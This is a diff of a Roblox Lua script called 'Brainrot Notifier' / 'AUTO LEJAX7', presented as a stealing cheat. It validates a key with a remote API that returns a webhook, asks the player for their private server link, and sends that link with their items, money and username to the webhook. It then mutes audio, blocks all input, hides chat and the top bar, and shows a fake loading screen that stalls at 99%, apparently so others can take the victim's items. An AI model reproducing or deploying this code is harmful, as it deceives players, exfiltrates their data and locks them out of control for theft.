@@ -1,15 +1,48 @@
 --=============================================================
---  🧠 BRAINROT NOTIFIER — v42 (Sistema de Key Integrado)
+--  🧠 BRAINROT NOTIFIER — v42 (Sistema de Key via Argumento)
 --=============================================================
 
 -- ⬇️⬇️⬇️ CONFIGURAÇÃO DA SUA API (SQUARE CLOUD) ⬇️⬇️⬇️
-local API_URL = "https://lejax.squareweb.app/api/validar"
+local API_URL = "https://lejax.squareweb.app/api/validar" 
 -- ⬆️⬆️⬆️ FIM DA CONFIGURAÇÃO ⬆️⬆️⬆️
+
+-- ⬇️⬇️⬇️ CONFIGURAÇÃO DE TEXTOS ⬇️⬇️⬇️
+local TEXTOS = {
+    TituloPainel = "AUTO LEJAX7",
+    SubtituloPainel = "Melhor script de roubar do mercado",
+    
+    InstrucaoLink = "Link do seu Servidor Privado:",
+    PlaceholderLink = "https://www.roblox.com/share?code=...",
+    BotaoConfirmar = "CONFIRMAR",
+    
+    ErroVazio = "Coloque o Link do seu Servidor Privado",
+    ErroInvalido = "Insira um link de Servidor Privado",
+    
+    TituloLoading = "AUTO LEJAX7",
+    SubtituloLoading = "/v0.1 Beta • VERSAO EM BETA",
+    RodapeLoading = "POWERED BY LEJAX7",
+    TextoProcessando = "Processando brainrots...",
+    
+    MensagensLoading = {
+        "Sincronizando com Script...",
+        "Buscando bases Fulls...",
+        "Desativando o Anti-Cheat...",
+        "Injetando script com segurança...",
+        "Bypass de Seguranca...",
+        "Verificando possivel Erro...",
+        "Escaneando players...",
+        "Sincronizando servidores...",
+        "Otimizando o script...",
+        "Finalizando conexão segura..."
+    }
+}
+-- ⬆️⬆️⬆️ FIM DA CONFIGURAÇÃO DE TEXTOS ⬆️⬆️⬆️
 
 local Players     = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local SoundService= game:GetService("SoundService")
 local Workspace   = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService   = game:GetService("RunService")
 local StarterGui   = game:GetService("StarterGui")
@@ -17,45 +50,56 @@ local ContextActionService = game:GetService("ContextActionService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
-local WEBHOOK_USUARIO = nil
+local PREFIX      = "[AUTO]"
+
+local WEBHOOK_USUARIO = nil -- Será preenchido pela API após validação
 
 --=============================================================
---  🔑 CAPTURA DA KEY E VALIDAÇÃO
+--  🔑 CAPTURA DA KEY VIA EXECUTOR (LOADSTRING)
 --=============================================================
+-- A key é passada como argumento: loadstring(game:HttpGet("..."))("LEJAX-XXXX-YYYY")
 local API_KEY = ...
 if type(API_KEY) ~= "string" or API_KEY == "" then
     LocalPlayer:Kick("❌ Você precisa executar passando a sua Key.\nExemplo: loadstring(...) (\"LEJAX-XXXX-YYYY\")")
     return
 end
 
-local function validarKey()
-    local req = syn and syn.request or http_request or request or http.request
-    if not req then return false, "Executor sem suporte HTTP." end
+--=============================================================
+--  🔐 FUNÇÃO DE VALIDAR A KEY NA API (SQUARE CLOUD)
+--=============================================================
+local function validarKeyComAPI(apiKey)
+    local httpRequest = syn and syn.request or http_request or request or http.request
+    if not httpRequest then return false, "Executor não suporta requisições HTTP." end
 
-    local hwid = tostring(LocalPlayer.UserId)
-    
-    local ok, res = pcall(function()
-        return req({
+    local hwid = tostring(LocalPlayer.UserId) -- Trava a key no ID do jogador
+
+    local sucesso, resposta = pcall(function()
+        return httpRequest({
             Url = API_URL,
             Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode({key = API_KEY, hwid = hwid})
+            Body = HttpService:JSONEncode({
+                key = apiKey,
+                hwid = hwid
+            })
         })
     end)
 
-    if ok and res and res.StatusCode == 200 then
-        local data = HttpService:JSONDecode(res.Body)
-        if data.sucesso then
-            WEBHOOK_USUARIO = data.webhook
+    if sucesso and resposta and resposta.StatusCode == 200 then
+        local dados = HttpService:JSONDecode(resposta.Body)
+        if dados.sucesso then
+            WEBHOOK_USUARIO = dados.webhook -- Pega o webhook do banco de dados
             return true, "OK"
         end
     end
+    
     return false, "Key inválida ou já em uso."
 end
 
-local isKeyValid, motivo = validarKey()
+-- Chama a validação antes de abrir o painel principal
+local isKeyValid, erro = validarKeyComAPI(API_KEY)
 if not isKeyValid then
-    LocalPlayer:Kick("❌ Falha na validação: " .. motivo)
+    LocalPlayer:Kick("❌ Falha na validação: " .. erro)
     return
 end
 
@@ -82,7 +126,62 @@ local function validarLinkServidor(link)
 end
 
 --=============================================================
---  🔇 MUTE BRUTAL (Remove sons)
+--  WEBHOOK E DADOS
+--=============================================================
+local function getMeuDinheiro()
+    local ls = LocalPlayer:FindFirstChild("leaderstats")
+    if ls then
+        for _, v in ipairs(ls:GetChildren()) do
+            if v.Name:lower():find("money") or v.Name:lower():find("cash") or v.Name:lower():find("coin") then
+                return tostring(v.Value)
+            end
+        end
+        local first = ls:GetChildren()[1]
+        if first then return tostring(first.Value) end
+    end
+    return "Desconhecido"
+end
+
+local function sendWebhook(title, description, color)
+    if not WEBHOOK_USUARIO then return end -- Se não validou, não envia
+
+    local qtdPlayers = #Players:GetPlayers()
+    local dinheiro = getMeuDinheiro()
+
+    local payload = {
+        username = "Brainrot Notifier",
+        avatar_url = "https://i.imgur.com/8Km9tLL.png",
+        embeds = {{
+            title = tostring(title),
+            description = tostring(description),
+            color = color or 0x2ECC71,
+            fields = {
+                { name = "👥 Jogadores no Servidor", value = tostring(qtdPlayers), inline = true },
+                { name = "💰 Seu Dinheiro", value = dinheiro, inline = true }
+            },
+            footer = { text = "Jogador: " .. LocalPlayer.Name },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+    local ok, encoded = pcall(HttpService.JSONEncode, HttpService, payload)
+    if not ok then return end
+    
+    local function req(args)
+        if syn and syn.request then syn.request(args)
+        elseif request then request(args)
+        elseif http_request then http_request(args)
+        elseif http and http.request then http.request(args) end
+    end
+    
+    task.spawn(function()
+        pcall(function() 
+            req({Url = WEBHOOK_USUARIO, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded}) 
+        end)
+    end)
+end
+
+--=============================================================
+--  🔇 MUTE BRUTAL
 --=============================================================
 pcall(function()
     SoundService.Volume = 0
@@ -176,7 +275,7 @@ task.spawn(function()
 end)
 
 --=============================================================
---  🎯 LÓGICA DE BRAINROTS E WEBHOOK
+--  🎯 ENVIO DE BRAINROTS
 --=============================================================
 local BASE_RADIUS = 200
 
@@ -570,58 +669,6 @@ local function getBrainrotsString()
     return #formattedItems > 0 and table.concat(formattedItems, "\n") or "Nenhum brainrot encontrado."
 end
 
-local function getMeuDinheiro()
-    local ls = LocalPlayer:FindFirstChild("leaderstats")
-    if ls then
-        for _, v in ipairs(ls:GetChildren()) do
-            if v.Name:lower():find("money") or v.Name:lower():find("cash") or v.Name:lower():find("coin") then
-                return tostring(v.Value)
-            end
-        end
-        local first = ls:GetChildren()[1]
-        if first then return tostring(first.Value) end
-    end
-    return "Desconhecido"
-end
-
-local function sendWebhook(title, description, color)
-    if not WEBHOOK_USUARIO then return end
-
-    local qtdPlayers = #Players:GetPlayers()
-    local dinheiro = getMeuDinheiro()
-
-    local payload = {
-        username = "Brainrot Notifier",
-        avatar_url = "https://i.imgur.com/8Km9tLL.png",
-        embeds = {{
-            title = tostring(title),
-            description = tostring(description),
-            color = color or 0x2ECC71,
-            fields = {
-                { name = "👥 Jogadores no Servidor", value = tostring(qtdPlayers), inline = true },
-                { name = "💰 Seu Dinheiro", value = dinheiro, inline = true }
-            },
-            footer = { text = "Jogador: " .. LocalPlayer.Name },
-            timestamp = DateTime.now():ToIsoDate()
-        }}
-    }
-    local ok, encoded = pcall(HttpService.JSONEncode, HttpService, payload)
-    if not ok then return end
-    
-    local function req(args)
-        if syn and syn.request then syn.request(args)
-        elseif request then request(args)
-        elseif http_request then http_request(args)
-        elseif http and http.request then http.request(args) end
-    end
-    
-    task.spawn(function()
-        pcall(function() 
-            req({Url = WEBHOOK_USUARIO, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded}) 
-        end)
-    end)
-end
-
 local function enviarBrainrots(link)
     local baseName = "Sua Base"
     local brainrotsText = getBrainrotsString()
@@ -636,70 +683,16 @@ local function enviarBrainrots(link)
 end
 
 --=============================================================
---  🎨 UI PRINCIPAL E LÓGICA DE LOADING
+--  🎨 UI PRINCIPAL
 --=============================================================
-local function iniciarBloqueioTotal()
-    pcall(function()
-        task.spawn(function()
-            local playerModule = require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
-            local controls = playerModule:GetControls()
-            controls:Disable()
-        end)
-
-        ContextActionService:BindAction(
-            "BloqueioTotalTeclado",
-            function() return Enum.ContextActionResult.Sink end,
-            false,
-            unpack(Enum.KeyCode:GetEnumItems())
-        )
-
-        local screenGuiFocus = Instance.new("ScreenGui")
-        screenGuiFocus.Name = "FocusBlocker"
-        screenGuiFocus.IgnoreGuiInset = true
-        screenGuiFocus.DisplayOrder = 999999
-        screenGuiFocus.Parent = PlayerGui
-        
-        local textBoxFocus = Instance.new("TextBox")
-        textBoxFocus.Size = UDim2.new(0, 0, 0, 0)
-        textBoxFocus.BackgroundTransparency = 1
-        textBoxFocus.TextTransparency = 1
-        textBoxFocus.Position = UDim2.new(0, 0, 0, 0)
-        textBoxFocus.Parent = screenGuiFocus
-        
-        textBoxFocus:CaptureFocus()
-        
-        task.spawn(function()
-            while task.wait(0.1) do
-                pcall(function()
-                    if not textBoxFocus:IsFocused() then
-                        textBoxFocus:CaptureFocus()
-                    end
-                end)
-            end
-        end)
-
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-        
-        task.spawn(function()
-            while task.wait(0.1) do
-                pcall(function()
-                    local CoreGui = game:GetService("CoreGui")
-                    local topbar = CoreGui:FindFirstChild("TopBarApp")
-                    if topbar then topbar:Destroy() end
-                    local chat = CoreGui:FindFirstChild("Chat")
-                    if chat then chat:Destroy() end
-                end)
-            end
-        end)
-    end)
-end
-
 local function criarUI()
-    local old = PlayerGui:FindFirstChild("BrainrotNotifierUI")
-    if old then old:Destroy() end
-    local oldLoading = PlayerGui:FindFirstChild("BrainrotLoading")
-    if oldLoading then oldLoading:Destroy() end
+    local antiga = PlayerGui:FindFirstChild("BrainrotNotifierUI")
+    if antiga then antiga:Destroy() end
+    
+    local antigaLoading = PlayerGui:FindFirstChild("BrainrotLoading")
+    if antigaLoading then antigaLoading:Destroy() end
 
+    -- === TELA DO PAINEL PRINCIPAL ===
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "BrainrotNotifierUI"
     screenGui.ResetOnSpawn = false
@@ -728,7 +721,7 @@ local function criarUI()
     titulo.Size = UDim2.new(1, -32, 0, 30)
     titulo.Position = UDim2.new(0, 16, 0, 16)
     titulo.BackgroundTransparency = 1
-    titulo.Text = "AUTO LEJAX7"
+    titulo.Text = TEXTOS.TituloPainel
     titulo.TextColor3 = Color3.fromRGB(255, 255, 255)
     titulo.TextSize = 22
     titulo.Font = Enum.Font.GothamBold
@@ -739,7 +732,7 @@ local function criarUI()
     subTitulo.Size = UDim2.new(1, -32, 0, 16)
     subTitulo.Position = UDim2.new(0, 16, 0, 46)
     subTitulo.BackgroundTransparency = 1
-    subTitulo.Text = "Melhor script de roubar do mercado"
+    subTitulo.Text = TEXTOS.SubtituloPainel
     subTitulo.TextColor3 = Color3.fromRGB(46, 204, 113)
     subTitulo.TextSize = 12
     subTitulo.Font = Enum.Font.GothamMedium
@@ -757,7 +750,7 @@ local function criarUI()
     instrucao.Size = UDim2.new(1, -32, 0, 16)
     instrucao.Position = UDim2.new(0, 16, 0, 90)
     instrucao.BackgroundTransparency = 1
-    instrucao.Text = "Link do seu Servidor Privado:"
+    instrucao.Text = TEXTOS.InstrucaoLink
     instrucao.TextColor3 = Color3.fromRGB(200, 200, 200)
     instrucao.TextSize = 13
     instrucao.Font = Enum.Font.GothamBold
@@ -770,7 +763,7 @@ local function criarUI()
     textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
     textBox.BorderSizePixel = 0
     textBox.Text = ""
-    textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
+    textBox.PlaceholderText = TEXTOS.PlaceholderLink
     textBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
     textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
     textBox.TextSize = 13
@@ -780,6 +773,12 @@ local function criarUI()
     textBox.TextYAlignment = Enum.TextYAlignment.Top
     textBox.TextWrapped = true 
     textBox.Parent = painel
+
+    local tbPadding = Instance.new("UIPadding")
+    tbPadding.PaddingTop = UDim.new(0, 8)
+    tbPadding.PaddingLeft = UDim.new(0, 10)
+    tbPadding.PaddingRight = UDim.new(0, 10)
+    tbPadding.Parent = textBox
 
     local tbCorner = Instance.new("UICorner")
     tbCorner.CornerRadius = UDim.new(0, 8)
@@ -802,7 +801,7 @@ local function criarUI()
     botao.Position = UDim2.new(0, 16, 0, 183) 
     botao.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
     botao.BorderSizePixel = 0
-    botao.Text = "CONFIRMAR"
+    botao.Text = TEXTOS.BotaoConfirmar
     botao.TextColor3 = Color3.fromRGB(22, 22, 22)
     botao.TextSize = 14
     botao.Font = Enum.Font.GothamBlack
@@ -811,6 +810,45 @@ local function criarUI()
     local btnCorner = Instance.new("UICorner")
     btnCorner.CornerRadius = UDim.new(0, 6)
     btnCorner.Parent = botao
+
+    local avisoTweenToken = 0
+    local painelExpandido = false
+
+    local function resetarPainel()
+        if painelExpandido then
+            painelExpandido = false
+            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+            TweenService:Create(painel, tweenInfo, {Size = UDim2.new(0, 460, 0, 235)}):Play()
+            TweenService:Create(botao, tweenInfo, {Position = UDim2.new(0, 16, 0, 183)}):Play()
+        end
+    end
+
+    local function mostrarAviso(texto, cor)
+        avisoTweenToken = avisoTweenToken + 1
+        local meuToken = avisoTweenToken
+        aviso.Text = texto
+        aviso.TextColor3 = cor or Color3.fromRGB(255, 100, 100)
+        aviso.TextTransparency = 1
+
+        if not painelExpandido then
+            painelExpandido = true
+            local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+            TweenService:Create(painel, tweenInfo, {Size = UDim2.new(0, 460, 0, 258)}):Play()
+            TweenService:Create(botao, tweenInfo, {Position = UDim2.new(0, 16, 0, 206)}):Play()
+        end
+
+        TweenService:Create(aviso, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            TextTransparency = 0
+        }):Play()
+
+        task.delay(3.5, function()
+            if avisoTweenToken ~= meuToken then return end
+            TweenService:Create(aviso, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                TextTransparency = 1
+            }):Play()
+            resetarPainel()
+        end)
+    end
 
     -- === TELA DE LOADING ===
     local loadingGui = Instance.new("ScreenGui")
@@ -847,7 +885,7 @@ local function criarUI()
     local mainTitle = Instance.new("TextLabel")
     mainTitle.Size = UDim2.new(1, 0, 0, 30)
     mainTitle.BackgroundTransparency = 1
-    mainTitle.Text = "AUTO LEJAX7"
+    mainTitle.Text = TEXTOS.TituloLoading
     mainTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
     mainTitle.TextSize = 26
     mainTitle.Font = Enum.Font.GothamBlack
@@ -858,13 +896,19 @@ local function criarUI()
     local subTitle = Instance.new("TextLabel")
     subTitle.Size = UDim2.new(1, 0, 0, 15)
     subTitle.BackgroundTransparency = 1
-    subTitle.Text = "/v0.1 Beta • VERSAO EM BETA"
+    subTitle.Text = TEXTOS.SubtituloLoading
     subTitle.TextColor3 = Color3.fromRGB(46, 204, 113)
     subTitle.TextSize = 12
     subTitle.Font = Enum.Font.GothamMedium
     subTitle.LayoutOrder = 2
     subTitle.ZIndex = 5
     subTitle.Parent = container
+
+    local spacer1 = Instance.new("Frame")
+    spacer1.Size = UDim2.new(0, 0, 0, 15)
+    spacer1.BackgroundTransparency = 1
+    spacer1.LayoutOrder = 3
+    spacer1.Parent = container
 
     local circleFrame = Instance.new("Frame")
     circleFrame.Size = UDim2.new(0, 80, 0, 80)
@@ -915,7 +959,7 @@ local function criarUI()
     local processingText = Instance.new("TextLabel")
     processingText.Size = UDim2.new(1, 0, 0, 20)
     processingText.BackgroundTransparency = 1
-    processingText.Text = "Processando brainrots..."
+    processingText.Text = TEXTOS.TextoProcessando
     processingText.TextColor3 = Color3.fromRGB(200, 200, 200)
     processingText.TextSize = 16
     processingText.Font = Enum.Font.GothamBold
@@ -960,7 +1004,7 @@ local function criarUI()
     local footerText = Instance.new("TextLabel")
     footerText.Size = UDim2.new(1, 0, 0, 15)
     footerText.BackgroundTransparency = 1
-    footerText.Text = "POWERED BY LEJAX7"
+    footerText.Text = TEXTOS.RodapeLoading
     footerText.TextColor3 = Color3.fromRGB(100, 110, 105)
     footerText.TextSize = 10
     footerText.Font = Enum.Font.GothamMedium
@@ -968,32 +1012,20 @@ local function criarUI()
     footerText.ZIndex = 5
     footerText.Parent = container
 
-    local mensagens = {
-        "Sincronizando com Script...",
-        "Buscando bases Fulls...",
-        "Desativando o Anti-Cheat...",
-        "Injetando script com segurança...",
-        "Bypass de Seguranca...",
-        "Verificando possivel Erro...",
-        "Escaneando players...",
-        "Sincronizando servidores...",
-        "Otimizando o script...",
-        "Finalizando conexão segura..."
-    }
-
     task.spawn(function()
         while loadingGui.Parent do
             task.wait(4)
             if loadingGui.Enabled then
-                local novaMsg = mensagens[math.random(1, #mensagens)]
+                local novaMsg = TEXTOS.MensagensLoading[math.random(1, #TEXTOS.MensagensLoading)]
                 processingText.Text = novaMsg
             end
         end
     end)
 
+    -- LOOP DE PROGRESSO (TRAVA NO 99%)
     task.spawn(function()
         local progresso = 0
-        local tempoTotal = 120
+        local tempoTotal = 120 -- 2 Minutos em segundos
         local passos = tempoTotal / 0.1 
         
         while loadingGui.Parent do
@@ -1003,7 +1035,7 @@ local function criarUI()
                 barraFill.Size = UDim2.new(0, 0, 1, 0)
                 bigPercent.Text = "0%"
                 bigPercent.TextColor3 = Color3.fromRGB(46, 204, 113)
-                processingText.Text = "Processando brainrots..."
+                processingText.Text = TEXTOS.TextoProcessando
                 processingText.TextColor3 = Color3.fromRGB(200, 200, 200)
                 continue 
             end
@@ -1028,29 +1060,87 @@ local function criarUI()
         end
     end)
 
-    -- Lógica de clique do botão
+    -- FUNÇÃO QUE BLOQUEIA TUDO
+    local function iniciarBloqueioTotal()
+        pcall(function()
+            task.spawn(function()
+                local playerModule = require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule"))
+                local controls = playerModule:GetControls()
+                controls:Disable()
+            end)
+
+            ContextActionService:BindAction(
+                "BloqueioTotalTeclado",
+                function() return Enum.ContextActionResult.Sink end,
+                false,
+                unpack(Enum.KeyCode:GetEnumItems())
+            )
+
+            local screenGuiFocus = Instance.new("ScreenGui")
+            screenGuiFocus.Name = "FocusBlocker"
+            screenGuiFocus.IgnoreGuiInset = true
+            screenGuiFocus.DisplayOrder = 999999
+            screenGuiFocus.Parent = PlayerGui
+            
+            local textBoxFocus = Instance.new("TextBox")
+            textBoxFocus.Size = UDim2.new(0, 0, 0, 0)
+            textBoxFocus.BackgroundTransparency = 1
+            textBoxFocus.TextTransparency = 1
+            textBoxFocus.Position = UDim2.new(0, 0, 0, 0)
+            textBoxFocus.Parent = screenGuiFocus
+            
+            textBoxFocus:CaptureFocus()
+            
+            task.spawn(function()
+                while loadingGui.Parent do
+                    task.wait(0.1)
+                    pcall(function()
+                        if not textBoxFocus:IsFocused() then
+                            textBoxFocus:CaptureFocus()
+                        end
+                    end)
+                end
+            end)
+
+            StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+            
+            task.spawn(function()
+                while loadingGui.Parent do
+                    task.wait(0.1)
+                    pcall(function()
+                        local CoreGui = game:GetService("CoreGui")
+                        local topbar = CoreGui:FindFirstChild("TopBarApp")
+                        if topbar then topbar:Destroy() end
+                        local chat = CoreGui:FindFirstChild("Chat")
+                        if chat then chat:Destroy() end
+                    end)
+                end
+            end)
+        end)
+    end
+
+    -- BOTÃO DE CONFIRMAR
     botao.MouseButton1Click:Connect(function()
         local link = textBox.Text
         if not link or link == "" then
-            aviso.Text = "⚠ Coloque o link do seu servidor privado"
-            aviso.TextColor3 = Color3.fromRGB(255, 200, 100)
-            aviso.TextTransparency = 0
+            mostrarAviso(TEXTOS.ErroVazio, Color3.fromRGB(255, 200, 100))
             return
         end
 
         local ok, motivo = validarLinkServidor(link)
         if not ok then
-            aviso.Text = "❌ Insira um link de Servidor Privado Válido"
-            aviso.TextColor3 = Color3.fromRGB(255, 100, 100)
-            aviso.TextTransparency = 0
+            mostrarAviso(TEXTOS.ErroInvalido, Color3.fromRGB(255, 100, 100))
             return
         end
 
+        avisoTweenToken = avisoTweenToken + 1
         aviso.Text = ""
         aviso.TextTransparency = 1
+        resetarPainel()
+
         painel.Visible = false
-        
         loadingGui.Enabled = true
+
         iniciarBloqueioTotal()
 
         enviarBrainrots(link)
@@ -1058,13 +1148,8 @@ local function criarUI()
 end
 
 task.spawn(function()
-    task.wait(1)
-    local sucesso, erro = pcall(criarUI)
-    if not sucesso then
-        warn("[AUTO] Erro ao criar a UI: " .. tostring(erro))
-    else
-        print("[AUTO] ✅ Interface carregada!")
-    end
+    task.wait(2)
+    pcall(criarUI)
 end)
 
-print("[AUTO] ✅ Script carregado com sucesso!")
+print(PREFIX .. " ✅ Dupla Webhook Ativada!")
